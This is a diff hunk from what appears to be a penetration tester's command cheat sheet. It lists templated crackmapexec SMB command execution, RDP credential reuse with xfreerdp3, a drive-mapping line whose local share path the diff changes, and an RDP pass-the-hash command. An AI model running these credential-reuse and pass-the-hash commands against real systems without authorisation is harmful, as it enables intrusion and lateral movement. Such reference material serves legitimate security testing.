@@ -22,7 +22,7 @@ crackmapexec smb {{TARGET}} -u {{USER}} -p {{PASS}} -x "whoami"
 
 # === RDP: CREDENTIAL REUSE (port 3389) ===
 xfreerdp3 /cert-ignore /u:{{USER}} /p:{{PASS}} /v:{{TARGET}}
-xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/share
+xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /p:{{PASS}} /v:{{TARGET}} /drive:share,/home/kali/tmp
 # Pass the hash via RDP
 xfreerdp3 /cert-ignore /u:{{USER}} /d:{{DOMAIN}} /pth:{{NTLM_HASH}} /v:{{TARGET}}
 
